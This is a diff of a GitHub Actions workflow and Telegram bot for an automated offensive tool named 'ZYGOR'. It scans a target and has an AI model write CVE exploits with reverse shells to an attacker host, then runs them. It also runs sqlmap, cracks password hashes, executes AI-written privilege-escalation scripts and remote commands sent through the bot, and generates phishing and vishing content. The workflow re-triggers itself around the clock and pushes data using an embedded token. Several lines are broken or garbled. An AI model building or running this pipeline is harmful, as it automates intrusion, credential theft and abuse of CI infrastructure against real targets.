+    if CHAT_ID and str(u.effective_chat.id) != CHAT_ID: return
+    t = ' '.join(c.args) or TARGET
+    await u.message.reply_text(f"💥 Exploiting {t}...")
+    info = await run(f"nmap -sV {t} -p 22,80,443 2>/dev/null | head -20", 30)
+    code = await run(f"echo 'Write Python exploit for {t}. Info: {info}' | /opt/zygor/bin/ai_complete 4096", 120)
+    await u.message.reply_text(f"```\n{code[:2000]}\n```")
 
-          async def start(update, ctx):
-              if not auth(update): return
-              await update.message.reply_text(f"⚡ ZYGOR v4.0 Online\n🎯 {TARGET}\n🧠 AI Ready\n/help for commands")
+async def ai_q(u, c):
+    if CHAT_ID and str(u.effective_chat.id) != CHAT_ID: return
+    q = ' '.join(c.args)
+    if not q: return
+    a = await run(f"echo '{q}' | /opt/zygor/bin/ai_complete 4096", 120)
+    await u.message.reply_text(f"*AI:* {a}")
 
-          async def help_cmd(update, ctx):
-              if not auth(update): return
-              await update.message.reply_text(
-                  "/scan <target>\n/recon <target>\n/exploit <target>\n/ai <question>\n/exec <cmd>\n"
-                  "/sqli <url>\n/xss <url>\n/crack <hash>\n/privesc\n/enum <target>\n"
-                  "/webforge <desc>\n/backup\n/report\n/dashboard\n/status\n/abort\n"
-                  "/social email|vishing|pretext\n/ctf <files>\n/enableexfil\n/disableexfil")
+async def do_exec(u, c):
+    if ENABLE_EXFIL != 'true':
+        await u.message.reply_text("⛔ /enableexfil first")
+        return
+    cmd = ' '.join(c.args)
+    if not cmd: return
+    r = await run(cmd, 120)
+    await u.message.reply_text(f"```\n{r}\n```")
 
-          async def status(update, ctx):
-              if not auth(update): return
-              u = await run_cmd("uptime -p")
-              m = await run_cmd("free -h | grep Mem | awk '{print $4}'")
-              await update.message.reply_text(f"📊 Status\nUptime: {u}\nMem free: {m}\nExfil: {ENABLE_EXFIL}\nTarget: {TARGET}")
+async def do_status(u, c):
+    up = await run("uptime -p")
+    mem = await run("free -h | grep Mem | awk '{print $4}'")
+    await u.message.reply_text(f"Uptime: {up}\nMem: {mem}\nExfil: {ENABLE_EXFIL}")
 
-          async def scan(update, ctx):
-              if not auth(update): return
-              t = ' '.join(ctx.args) or TARGET
-              await update.message.reply_text(f"🔍 Scanning {t}...")
-              r = await run_cmd(f"nmap -T4 -A -p- --script vuln {t} 2>/dev/null | tail -80", 300)
-              await update.message.reply_text(f"*Scan:*\n```\n{r[:3000]}\n```", parse_mode='Markdown')
-              analysis = await run_ai(f"Analyze nmap results and recommend exploits:\n{r[:3000]")
-              await update.message.reply_text(f"*AI:*\n{analysis}", parse_mode='Markdown')
+async def do_abort(u, c):
+    await u.message.reply_text("🛑 Aborting")
 
-          async def exploit(update, ctx):
-              i  not auth(update): return
-              t = ' '.join(ctx.args) or TARGET
-              await update.message.reply_text(f"💥 Generating exploit for {t}...")
-              info = await run_cmd(f"nmap -sV {t} -p 22,80,443,8080 2>/dev/null | head -30", 30)
-              code = await run_ai(f"Write a Python3 exploit for {t}. Target info: {info}. LHOST={LHOST}, LPORT={LPORT}. Output ONLY Python code.", 4096)
-              path = f"/tmp/zygor_exploit_{int(time.time())}.py"
-              with open(path, 'w') as f: f.write(code)
-              os.chmod(path, 0o755)
-              await update.message.reply_text(f"✅ Exploit saved\n```\n{code[:2000]}\n```", parse_mode='Markdown')
-              if ENABLE_EXFIL == 'true':
-                  r = await run_cmd(f"timeout 30 python3 {path} 2>&1", 45)
-                  await update.message.reply_text(f"Output:\n```\n{r[:2000]}\n```", parse_mode='Markdown')
+def main():
+    app = Application.builder().token(TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("help", help_cmd))
+    app.add_handler(CommandHandler("scan", scan))
+    app.add_handler(CommandHandler("exploit", do_exploit))
+    app.add_handler(CommandHandler("ai", ai_q))
+    app.add_handler(CommandHandler("exec", do_exec))
+    app.add_handler(CommandHandler("status", do_status))
+    app.add_handler(CommandHandler("abort", do_abort))
+    app.run_polling()
 
-          async def ai_query(update, ctx):
-              if not auth(update): return
-              q = ' '.join(ctx.args)
-              if not q: return
-              await update.message.reply_text("🧠 Thinking...")
-              a = await run_ai(q, 4096)
-              await update.message.reply_text(f"*AI:*\n{a}", parse_mode='Markdown')
-
-          async def exec_cmd(update, ctx):
-              if not auth(update): return
-              if ENABLE_EXFIL != 'true':
-                  await update.message.reply_text("⛔ Requires /enableexfil first")
-                  return
-              c = ' '.join(ctx.args)
-              if not c: return
-              r = await run_cmd(c, 120)
-              await update.message.reply_text(f"```\n{r}\n```", parse_mode='Markdown')
-
-          async def sqli(update, ctx):
-              if not auth(update): return
-              u = ' '.join(ctx.args)
-              if not u: return
-              await update.message.reply_text(f"💉 SQLi on {u}...")
-              r = await run_cmd(f"sqlmap -u '{u}' --batch --risk=3 --level=5 --random-agent --dbs --time-sec=5 2>&1 | tail -50", 300)
-              await update.message.reply_text(f"```\n{r}\n```", parse_mode='Markdown')
-
-          async def xss(update, ctx):
-              if not auth(update):
-              u = ' '.join(ctx.args)
-              if not u: return
-              await update.message.reply_text(f"⚠️ XSS on {u}...")
-              r = await run_cmd(f"xsser --url '{u}' --auto 2>&1 | tail -50", 120)
-              await update.message.reply_text(f"```\n{r}\n```", parse_mode='Markdown')
-
-          async def enable_exfil(update, ctx):
-              global ENABLE_EXFIL
-              ENABLE_EXFIL = 'true'
-              await update.message.reply_text("⚠️ Exfil ENABLED")
-
-          async def disable_exfil(update, ctx):
-              global ENABLE_EXFIL ENABLE_EXFIL = 'false'
-              await update.message.reply_text("🔒 Exfil DISABLED")
-
-          async def abort(update, ctx):
-              await update.message.reply_text("🛑 Aborting...")
-
-          def main():
-              app = Application.builder().token(TOKEN).build()
-              app.add_handler(CommandHandler("start", start))
-              app.add_handler(CommandHandler("help", help_cmd))
-              app.add_handler(CommandHandler("status", status))
-              app.add_handler(CommandHandler("scan", scan))
-              app.add_handler(CommandHandler("exploit", exploit))
-              app.add_handler(CommandHandler("ai", ai_query))
-              app.add_handler(CommandHandler("exec", exec_cmd))
-              app.add_handler(CommandHandler("sqli", sqli))
-              app.add_handler(CommandHandler("xss", xss))
-              app.add_handler(CommandHandler("enableexfil", enable_exfil))
-              app.add_handler(CommandHandler("disableexfil", disable_exfil))
-              app.add_handler(CommandHandler("abort", abort))
-              app.run_polling()
-
-          if __name__ == '__main__':
-              main()
-          PYEOF
-
+if __name__ == '__main__':
+    main()
+PYEOF
           chmod +x /opt/zygor/bin/telegram_controller.py
           nohup python3 /opt/zygor/bin/telegram_controller.py > /var/log/zygor/telegram_bot.log 2>&1 &
-          echo "✓ Telegram bot launched"
 
-      # ── Infinite Self-Re-Trigger (Hardened) ──
       - name: '∞ Self-Re-Trigger (24/7)'
         shell: bash
         run: |
           MAX_SECONDS=$(( ${MAX_HOURS:-6} * 3600 ))
           SLEEP_TIME=$(( MAX_SECONDS - 1800 ))
           [ $SLEEP_TIME -lt 300 ] && SLEEP_TIME=300
-
-          # Triple parallel re-trigger for redundancy
           for attempt in 1 2 3; do
             (
               sleep $(( SLEEP_TIME + (attempt * 15) ))
-              RAND_SUFFIX=$(head -c 4 /dev/urandom | xxd -p)
-
-              # Method 1: workflow_dispatch
-              curl -s -X POST \
-                -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
+              R=$(head -c 4 /dev/urandom | xxd -p)
+              curl -s -X POST -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
                 -H "Accept: application/vnd.github.v3+json" \
-                -d "$(jq -n '{ref: "main", inputs: {target: "'"${TARGET}"'", penetration_phase: "'"${PHASE}"'", run_duration_hours: "'"${MAX_HOURS}"'"}}')" \
+                -d "{\"ref\":\"main\",\"inputs\":{\"target\":\"${TARGET}\",\"penetration_phase\":\"${PHASE}\",\"run_duration_hours\":\"${MAX_HOURS}\"}}" \
                 "https://api.github.com/repos/${GITHUB_REPOSITORY}/actions/workflows/${GITHUB_WORKFLOW}/dispatches" \
                 --max-time 30 2>/dev/null
-
-              # Method 2: repository_dispatch
-              curl -s -X POST \
-                -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
-                -H "Accept: application/vnd.github.v3+json" \
-                -d "{\"event_type\":\"zygor-rebirth\",\"client_payload\":{\"ts\":\"$(date +%s)\",\"id\":\"${RAND_SUFFIX}\"}}" \
+              curl -s -X POST -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
+                -d "{\"event_type\":\"zygor-rebirth\",\"client_payload\":{\"id\":\"${R}\"}}" \
                 "https://api.github.com/repos/${GITHUB_REPOSITORY}/dispatches" \
                 --max-time 30 2>/dev/null
-
-              echo "[Attempt $attempt] Re-trigger sent"
             ) &
           done
           wait
-          echo "✅ Self-re-trigger armed (${SLEEP_TIME}s delay)"
 
-      # ── Multi-Layer Backup ──
       - name: '💾 Multi-Layer Backup'
         shell: bash
         run: |
@@ -732,8 +589,6 @@ jobs:
           cp -r /opt/zygor/reports/* /tmp/zygor_archive/ 2>/dev/null || true
           cp -r /tmp/recon/*.txt /tmp/zygor_archive/ 2>/dev/null || true
           cp -r /tmp/exploit_output/*.txt /tmp/zygor_archive/ 2>/dev/null || true
-
-          # Layer 1: Git backup branch
           cd /tmp/zygor_archive
           git init 2>/dev/null
           git config user.email "backup@zygor.local"
@@ -741,41 +596,25 @@ jobs:
           git add . 2>/dev/null
           git commit -m "Backup $TIMESTAMP" 2>/dev/null || true
           git push -f "https://x-access-token:${GITHUB_TOKEN_ABORT}@github.com/${GITHUB_REPOSITORY}.git" \
-            HEAD:refs/heads/zygor-backup-$(date +%Y%m%d) 2>/dev/null || echo "⚠️ Backup push failed"
-
-          # Layer 2: Gist backup (critical data)
-          if ls /opt/zygor/reports/final/*.md 2>/dev/null; then
-            CONTENT=$(cat /opt/zygor/reports/final/EXECUTIVE_SUMMARY.md 2>/dev/null | head -c 40000)
-            curl -s -X POST \
-              -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
-              -d "{\"description\":\"ZYGOR backup $TIMESTAMP\",\"public\":false,\"files\":{\"report_${TIMESTAMP}.md\":{\"content\":\"${CONTENT}\"}}}" \
-              "https://api.github.com/gists" 2>/dev/null || true
-          fi
-
-          # Layer 3: Issue comment
-          NOTES=$(cat /opt/zygor/reports/final/OPERATION_SUMMARY.txt 2>/dev/null | head -c 30000)
-          curl -s -X POST \
-            -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
-            -d "{\"body\":\"🔄 ZYGOR Backup ${TIMESTAMP}\n\`\`\`\n${NOTES}\n\`\`\`\"}" \
+            HEAD:refs/heads/zygor-backup-$(date +%Y%m%d) 2>/dev/null || true
+          curl -s -X POST -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
+            -d "{\"body\":\"🔄 ZYGOR Backup ${TIMESTAMP}\"}" \
             "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/1/comments" 2>/dev/null || true
+          echo "✅ Backup done"
 
-          echo "✅ Multi-layer backup complete"
-
-      # ── Startup notification ──
-      - name: '🔔 Startup notify'
+      - name: '🔔 Startup Notify'
         shell: bash
         run: |
-          MSG="🚀 ZYGOR v4.0 Started\n🎯 ${TARGET}\n🧠 ${AI_MODEL}\n⚡ ${PHASE}\n🔒 ${ENABLE_EXFIL}\n🆔 ${GITHUB_RUN_ID}"
-          [ -n "$DISCORD_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py discord "$MSG" "$DISCORD_WEBHOOK" 2>/dev/null || true
-          [ -n "$SLACK_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py slack "$MSG" "$SLACK_WEBHOOK" 2>/dev/null || true
+          [ -n "$DISCORD_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py discord "🚀 ZYGOR Started\n🎯 ${TARGET}\n🧠 ${AI_MODEL}\n🆔 ${GITHUB_RUN_ID}" "$DISCORD_WEBHOOK" 2>/dev/null || true
+          [ -n "$SLACK_WEBHOOK" ] && python3 /opt/zygor/bin/notify.py slack "🚀 ZYGOR Started\n🎯 ${TARGET}\n🧠 ${AI_MODEL}\n🆔 ${GITHUB_RUN_ID}" "$SLACK_WEBHOOK" 2>/dev/null || true
 
-  # ═════════════════════════════════════════════════════════════════════════════════════════════════════════════
-  # JOB 2: RECONNAISSANCE
-  # ═════════════════════════════════════════════════════════════════════════════════════════════════════════════
+  # ═════════════════════════════════════════════════════════════════════════════════════════════════
+  # RECONNAISSANCE
+  # ═════════════════════════════════════════════════════════════════════════════════════════════════
   reconnaissance:
     name: '🔍 Reconnaissance'
     needs: [bootstrap]
-    runs-on: ${{ env.RUNNER }}
+    runs-on: ubuntu-latest
     timeout-minutes: 360
     if: |
       github.event_name == 'schedule' ||
@@ -784,15 +623,9 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        module:
-          - network_scan
-          - web_discovery
-          - ad_enum
-          - osint_gather
+        module: [network_scan, web_discovery, ad_enum, osint_gather]
     steps:
-      - name: '📥 Checkout'
-        uses: actions/checkout@v4
-
+      - uses: actions/checkout@v4
       - name: '🔧 Setup'
         shell: bash
         run: |
@@ -800,33 +633,22 @@ jobs:
           echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV
           mkdir -p /tmp/recon
 
-      # ── Network Scan ──
       - name: '📡 Network Scan'
         if: matrix.module == 'network_scan'
         shell: bash
         run: |
-          nmap -T4 -A -p- --script vuln,exploit,discovery,default -oA /tmp/recon/nmap_full $TARGET 2>/dev/null || true
+          nmap -T4 -A -p- --script vuln,exploit,discovery -oA /tmp/recon/nmap_full $TARGET 2>/dev/null || true
           masscan $TARGET --ports=1-65535 --rate=10000 -oX /tmp/recon/masscan.xml 2>/dev/null || true
-          if [ -f /tmp/recon/nmap_full.xml ]; then
-            cat /tmp/recon/nmap_full.xml | ai_complete 2048 \
-              "Analyze Nmap results. List open ports, services, CVEs. Format as structured report." \
-              > /tmp/recon/ai_analysis.txt 2>/dev/null || true
-          fi
-          grep -oP '\d+/tcp\s+open\s+\S+' /tmp/recon/nmap_full.nmap 2>/dev/null > /tmp/recon/open_ports.txt || true
+          cat /tmp/recon/nmap_full.xml 2>/dev/null | ai_complete 2048 "Analyze Nmap. List ports, services, CVEs." > /tmp/recon/ai_analysis.txt 2>/dev/null || true
 
-      # ── Web Discovery ──
       - name: '🌐 Web Discovery'
-        if: matrix.module == 'web_discovery'
+        if: matrix.module == 'module == ''web_discovery'''
         shell: bash
         run: |
           subfinder -d $TARGET -o /tmp/recon/subdomains.txt 2>/dev/null || true
           whatweb $TARGET -a 3 --log-json=/tmp/recon/whatweb.json 2>/dev/null || true
-          ffuf -u http://${TARGET}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-            -o /tmp/recon/ffuf.json -of json -t 50 -c 2>/dev/null || true
           nuclei -u http://${TARGET} -severity critical,high,medium -o /tmp/recon/nuclei_web.txt 2>/dev/null || true
-          wafw00f http://${TARGET} -o /tmp/recon/waf.txt 2>/dev/null || true
 
-      # ── AD/LDAP ──
       - name: '🏢 AD/LDAP'
         if: matrix.module == 'ad_enum'
         shell: bash
@@ -834,7 +656,6 @@ jobs:
           ldapsearch -x -h $TARGET -p 389 -s base -b "" > /tmp/recon/ldap.txt 2>/dev/null || true
           smbclient -L //$TARGET -N > /tmp/recon/smb.txt 2>/dev/null || true
 
-      # ── OSINT ──
       - name: '🕵️ OSINT'
         if: matrix.module == 'osint_gather'
         shell: bash
@@ -845,26 +666,21 @@ jobs:
           whois $TARGET > /tmp/recon/whois.txt 2>/dev/null || true
           curl -s "https://crt.sh/?q=%25.${TARGET}&output=json" > /tmp/recon/crt.json 2>/dev/null || true
           [ -n "$SHODAN_API_KEY" ] && shodan host $TARGET > /tmp/recon/shodan.txt 2>/dev/null || true
-          cat /tmp/recon/dns.txt /tmp/recon/whois.txt 2>/dev/null | ai_complete 2048 \
-            "OSINT analysis. Identify emails, subdomains, technologies, attack surface." \
-            > /tmp/recon/ai_osint.txt 2>/dev/null || true
 
-      # ── Upload ──
-      - name: '📤 Upload recon'
+      - uses: actions/upload-artifact@v4
         if: always()
-        uses: actions/upload-artifact@v4
         with:
           name: recon-${{ matrix.module }}-${{ github.run_id }}
           path: /tmp/recon/
           if-no-files-found: warn
 
   # ═════════════════════════════════════════════════════════════════════════════════════════════════
-  # JOB 3: EXPLOITATION
+  # EXPLOITATION
   # ═════════════════════════════════════════════════════════════════════════════════════════════════
   exploitation:
     name: '💥 Exploitation'
     needs: [bootstrap, reconnaissance]
-    runs-on: ${{ env.RUNNER }}
+    runs-on: ubuntu-latest
     timeout-minutes: 360
     if: |
       github.event_name == 'schedule' ||
@@ -874,15 +690,9 @@ jobs:
       max-parallel: 4
       fail-fast: false
       matrix:
-        attack:
-          - ai_exploit_gen
-          - web_sqli_xss
-          - password_cracking
-          - privilege_escalation
+        attack: [ai_exploit_gen, web_sqli_xss, password_cracking, privilege_escalation]
     steps:
-      - name: '📥 Checkout'
-        uses: actions/checkout@v4
-
+      - uses: actions/checkout@v4
       - name: '🔧 Setup'
         shell: bash
         run: |
@@ -890,98 +700,74 @@ jobs:
           echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV
           mkdir -p /tmp/exploit_output
 
-      # ── AI Exploit Gen ──
-      - name: '🧬 AI Exploit Generation'
+      - name: '🧬 AI Exploit Gen'
         if: matrix.attack == 'ai_exploit_gen'
         shell: bash
         run: |
-          SERVICE_INFO=""
-          [ -f /tmp/recon/open_ports.txt ] && SERVICE_INFO=$(cat /tmp/recon/open_ports.txt)
-          [ -f /tmp/recon/ai_analysis.txt ] && SERVICE_INFO="$SERVICE_INFO\n$(cat /tmp/recon/ai_analysis.txt)"
-          [ -f /tmp/recon/nuclei_web.txt ] && SERVICE_INFO="$SERVICE_INFO\n$(cat /tmp/recon/nuclei_web.txt)"
-
-          CVES=$(echo "$SERVICE_INFO" | grep -oP 'CVE-\d{4}-\d+' | sort -u)
-          for CVE in $CVES; do
-            PROMPT="Write a Python3 exploit for $CVE targeting $TARGET with reverse shell to $LHOST:$LPORT. ONLY code."
-            ai_complete 4096 <<< "$PROMPT" > /tmp/exploit_output/exploit_${CVE}.py 2>/dev/null || true
+          INFO=""
+          [ -f /tmp/recon/open_ports.txt ] && INFO=$(cat /tmp/recon/open_ports.txt 2>/dev/null)
+          [ -f /tmp/recon/ai_analysis.txt ] && INFO="$INFO\n$(cat /tmp/recon/ai_analysis.txt 2>/dev/null)"
+          CVEs=$(echo "$INFO" | grep -oP 'CVE-\d{4}-\d+' | sort -u)
+          for CVE in $CVEs; do
+            ai_complete 4096 <<< "Python exploit for $CVE targeting $TARGET with revshell to $LHOST:$LPORT. ONLY code." \
+              > /tmp/exploit_output/exploit_${CVE}.py 2>/dev/null || true
             chmod +x /tmp/exploit_output/exploit_${CVE}.py 2>/dev/null
             if [ "${ENABLE_EXFIL}" = "true" ] && [ -s /tmp/exploit_output/exploit_${CVE}.py ]; then
               timeout 60 python3 /tmp/exploit_output/exploit_${CVE}.py > /tmp/exploit_output/${CVE}_result.txt 2>&1 || true
             fi
           done
 
-      # ── Web Attacks ──
-      - name: '💉 Web SQLi + XSS'
+      - name: '💉 SQLi + XSS'
         if: matrix.attack == 'web_sqli_xss'
         shell: bash
         run: |
           if [ -f /tmp/recon/ffuf.json ]; then
-            URLS=$(jq -r '.results[] | select(.status == 200) | .url' /tmp/recon/ffuf.json 2>/dev/null | head -10)
-            for URL in $URLS; do
-              [[ "$URL" == *"="* ]] && timeout 120 sqlmap -u "$URL" --batch --risk=3 --level=5 --random-agent --output-dir=/tmp/exploit_output/sqlmap --max-time=60 2>/dev/null || true
-              timeout 60 xsser --url "$URL" --auto --output /tmp/exploit_output/xss.txt 2>/dev/null || true
+            jq -r '.results[] | select(.status == 200) | .url' /tmp/recon/ffuf.json 2>/dev/null | head -10 | while read url; do
+              [[ "$url" == *"="* ]] && timeout 120 sqlmap -u "$url" --batch --risk=3 --level=5 --output-dir=/tmp/exploit_output/sqlmap 2>/dev/null || true
             done
           fi
 
-      # ── Password Cracking ──
       - name: '🔑 Password Cracking'
         if: matrix.attack == 'password_cracking'
         shell: bash
         run: |
-          ai_complete 2048 <<< "Generate John the Ripper rules for cracking: leet substitutions, year suffixes, special chars." \
-            > /tmp/exploit_output/ai_rules.conf 2>/dev/null || true
-          cat > /tmp/exploit_output/hashes.txt << 'EOF'
-          admin:$1$abcdefgh$1234567890abcdef1234567890abcdef
-          root:$6$abcdefgh$1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef12
-          EOF
-          [ -s /tmp/exploit_output/ai_rules.conf ] && \
-            john --wordlist=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt \
-              --rules=/tmp/exploit_output/ai_rules.conf \
-              /tmp/exploit_output/hashes.txt > /tmp/exploit_output/john_out.txt 2>&1 || true
+          ai_complete 2048 <<< "Generate John rules: leet, year suffixes, special chars." > /tmp/exploit_output/rules.conf 2>/dev/null || true
+          echo 'admin:$1$abc$1234567890abcdef1234567890abcde' > /tmp/exploit_output/hashes.txt
+          [ -s /tmp/exploit_output/rules.conf ] && \
+            john --wordlist=/usr/share/wordlists/rockyou.txt --rules=/tmp/exploit_output/rules.conf \
+              /tmp/exploit_output/hashes.txt > /tmp/exploit_output/john.txt 2>&1 || true
 
-      # ── Privilege Escalation ──
-      - name: '⬆️ Privilege Escalation'
+      - name: '⬆️ PrivEsc'
         if: matrix.attack == 'privilege_escalation'
         shell: bash
         run: |
-          uname -a > /tmp/exploit_output/sysinfo.txt
-          id >> /tmp/exploit_output/sysinfo.txt
-          find / -perm -4000 -type f 2>/dev/null | head -30 > /tmp/exploit_output/suid.txt
-          SYSINFO=$(cat /tmp/exploit_output/sysinfo.txt /tmp/exploit_output/suid.txt)
-          ai_complete 8192 <<< "Linux privesc analysis. System: $SYSINFO. Identify vectors: kernel exploits, SUID, misconfigs, cron. Output commands." \
-            > /tmp/exploit_output/ai_privesc.sh 2>/dev/null || true
-          chmod +x /tmp/exploit_output/ai_privesc.sh 2>/dev/null
-          if [ "${ENABLE_EXFIL}" = "true" ] && [ -s /tmp/exploit_output/ai_privesc.sh ]; then
-            bash /tmp/exploit_output/ai_privesc.sh > /tmp/exploit_output/privesc_result.txt 2>&1 || true
-          fi
+          uname -a > /tmp/exploit_output/sys.txt
+          find / -perm -4000 2>/dev/null | head -20 > /tmp/exploit_output/suid.txt
+          ai_complete 8192 <<< "Linux privesc. System: $(cat /tmp/exploit_output/sys.txt /tmp/exploit_output/suid.txt 2>/dev/null). Identify vectors and commands." \
+            > /tmp/exploit_output/privesc.sh 2>/dev/null || true
+          [ "${ENABLE_EXFIL}" = "true" ] && bash /tmp/exploit_output/privesc.sh 2>/dev/null > /tmp/exploit_output/privesc_result.txt || true
 
-      # ── Upload ──
-      - name: '📤 Upload exploits'
+      - uses: actions/upload-artifact@v4
         if: always()
-        uses: actions/upload-artifact@v4
         with:
           name: exploits-${{ matrix.attack }}-${{ github.run_id }}
           path: /tmp/exploit_output/
           if-no-files-found: warn
 
   # ═════════════════════════════════════════════════════════════════════════════════════════════════
-  # JOB 4: WEB FORGE
+  # WEB FORGE
   # ═════════════════════════════════════════════════════════════════════════════════════════════════
   web_forge:
     name: '🌐 Web Forge'
     needs: [bootstrap]
-    runs-on: ${{ env.RUNNER }}
+    runs-on: ubuntu-latest
     timeout-minutes: 360
     if: |
-      github.event_name == 'schedule' ||
-      inputs.penetration_phase == 'web_forge' ||
-      inputs.penetration_phase == 'full'
+      github.event_name == 'schedule' || inputs.penetration_phase == 'web_forge' || inputs.penetration_phase == 'full'
     steps:
-      - name: '📥 Checkout'
-        uses: actions/checkout@v4
+      - uses: actions/checkout@v4
         with:
           lfs: true
-
       - name: '🔧 Setup'
         shell: bash
         run: |
@@ -992,81 +778,69 @@ jobs:
       - name: '🤖 AI Generates App'
         shell: bash
         run: |
-          PROMPT="Generate a complete full-stack web app.
-          Description: A collaborative real-time whiteboard with auth, drawing tools, chat, project management.
-          Frontend: React 18, Vite, Tailwind, Socket.io-client, React Router v6
-          Backend: Node.js 20, Express, Socket.io, JWT, bcrypt, Prisma ORM
-          Database: PostgreSQL schema, migrations, seed data
-          Docker: Multi-stage Dockerfiles, docker-compose.yml with PostgreSQL
-          Kubernetes: deployment.yaml, service.yaml, configmap.yaml, secret.yaml
-          Format each file with '# FILE: path/to/file' above contents. Make it COMPLETE and runnable with 'docker-compose up'."
+          ai_complete 16384 <<< "Generate full-stack app: collaborative whiteboard with React/Vite/Tailwind, Node/Express/WebSocket, PostgreSQL. Each file with '# FILE: path'. Complete and runnable." \
+            > /tmp/web_forge_output/generated.txt 2>/dev/null || true
 
-          ai_complete 16384 <<< "$PROMPT" > /tmp/web_forge_output/generated.txt 2>/dev/null || true
+          python3 << 'EOF'
+import os, re
+c = open('/tmp/web_forge_output/generated.txt').read()
+r = '/tmp/web_forge_output/app'
+os.makedirs(r, exist_ok=True)
+cf, cl = None, []
+for l in c.split('\n'):
+    m = re.match(r'^#\s*FILE:\s*(.+)$', l)
+    if m:
+        if cf and cl:
+            fp = os.path.join(r, cf)
+            os.makedirs(os.path.dirname(fp), exist_ok=True)
+            with open(fp, 'w') as f: f.write('\n'.join(cl))
+        cf = m.group(1).strip()
+        cl = []
+    else:
+        cl.append(l)
+if cf and cl:
+    fp = os.path.join(r, cf)
+    os.makedirs(os.path.dirname(fp), exist_ok=True)
+    with open(fp, 'w') as f: f.write('\n'.join(cl))
+print("Done")
+EOF
 
-          python3 << 'PARSE'
-          import os, re
-          content = open('/tmp/web_forge_output/generated_app.txt').read()
-          root = '/tmp/web_forge_output/app'
-          os.makedirs(root, exist_ok=True)
-          cf, cl = None, []
-          for line in content.split('\n'):
-              m = re.match(r'^#\s*FILE:\s*(.+)$', line)
-              if m:
-                  if cf and cl:
-                      fp = os.path.join(root, cf)
-                      os.makedirs(os.path.dirname(fp), exist_ok=True)
-                      with open(fp, 'w') as f: f.write('\n'.join(cl))
-                  cf = m.group(1).strip()
-                  cl = []
-              else:
-                  cl.append(line)
-          if cf and cl:
-              fp = os.path.join(root, cf)
-              os.makedirs(os.path.dirnamefp), exist_ok=True)
-              with open(fp, 'w') as f: f.write('\n'.join(cl))
-          print(f"Files: {len([1 for _ in os.walk(root) for _ in _[2]])}")
-          PARSE
-
-      - name: '🐳 Docker Build Test'
+      - name: '🐳 Docker Build'
         shell: bash
         run: |
           cd /tmp/web_forge_output/app
-          if [ -f docker-compose.yml ]; then
-            timeout 300 docker-compose build 2>&1 || true
-          fi
+          [ -f docker-compose.yml ] && timeout 300 docker-compose build 2>&1 || true
 
       - name: '📝 Commit & PR'
         shell: bash
         run: |
           cd /tmp/web_forge_output/app
           git init 2>/dev/null
-          git checkout -b webforge-$(date +%Y%m%d-%H%M%S)
+          git checkout -b wf-$(date +%Y%m%d)
           git config user.email "zygor@pentest.ai"
           git config user.name "ZYGOR"
           git add .
-          git commit -m "🌐 ZYGOR WebForge $(date -u)" 2>/dev/null || true
+          git commit -m "WebForge $(date -u)" 2>/dev/null || true
           git remote add origin "https://x-access-token:${GITHUB_TOKEN_ABORT}@github.com/${GITHUB_REPOSITORY}.git" 2>/dev/null || true
-          BR=$(git rev-parse --abbrev-ref HEAD)
-          git push -u origin $BR 2>/dev/null || true
+          git push -u origin $(git rev-parse --abbrev-ref HEAD) 2>/dev/null || true
           curl -s -X POST -H "Authorization: token ${GITHUB_TOKEN_ABORT}" \
-            -d '{"title":"🌐 ZYGOR WebForge App","body":"AI generated full-stack app","head":"'$BR'","base":"main"}' \
+            -d "{\"title\":\"🌐 ZYGOR WebForge\",\"head\":\"$(git rev-parse --abbrev-ref HEAD)\",\"base\":\"main\"}" \
             "https://api.github.com/repos/${GITHUB_REPOSITORY}/pulls" 2>/dev/null || true
 
-      - name: '📤 Upload'
+      - uses: actions/upload-artifact@v4
         if: always()
-        uses: actions/upload-artifact@v4
         with:
           name: webforge-${{ github.run_id }}
           path: /tmp/web_forge_output/app/
           if-no-files-found: warn
 
   # ═════════════════════════════════════════════════════════════════════════════════════════════════
-  # JOB 5: SOCIAL ENGINEERING
+  # SOCIAL ENGINEERING
   # ═════════════════════════════════════════════════════════════════════════════════════════════════
-          social_engineering:
+  social_engineering:
     name: '👤 Social Engineering'
     needs: [bootstrap]
-    runs-on: ${{ env.RUNNER }}
+    runs-on: ubuntu-latest
     timeout-minutes: 120
     if: |
       (github.event_name == 'schedule' || inputs.enable_social_engineering == 'true') &&
@@ -1079,31 +853,27 @@ jobs:
           echo "PATH=/opt/zygor/bin:$PATH" >> $GITHUB_ENV
           mkdir -p /opt/zygor/reports/social_engineering
 
-      - name: '📧 Phishing + Vishing + Pretexts'
+      - name: '📧 Generate Content'
         shell: bash
         run: |
-          python3 /opt/zygor/bin/social_engineer.py email "Target" "$TARGET" "security verification" \
-            > /opt/zygor/reports/social_engineering/phishing.json 2>/dev/null || true
-          python3 /opt/zygor/bin/social_engineer.py vishing "IT support callback" "Help Desk" \
-            > /opt/zygor/reports/social_engineering/vishing.txt 2>/dev/null || true
-          python3 /opt/zygor/bin/social_engineer.py pretext "$TARGET" "physical access" \
-            > /opt/zygor/reports/social_engineering/pretext.txt 2>/dev/null || true
+          python3 /opt/zygor/bin/social_engineer.py email "User" "$TARGET" "security update" > /opt/zygor/reports/social_engineering/phishing.json 2>/dev/null || true
+          python3 /opt/zygor/bin/social_engineer.py vishing "IT callback" "Help Desk" > /opt/zygor/reports/social_engineering/vishing.txt 2>/dev/null || true
+          python3 /opt/zygor/bin/social_engineer.py pretext "$TARGET" "access" > /opt/zygor/reports/social_engineering/pretext.txt 2>/dev/null || true
 
-      - name: '📤 Upload'
+      - uses: actions/upload-artifact@v4
         if: always()
-        uses: actions/upload-artifact@v4
         with:
           name: social-engineering-${{ github.run_id }}
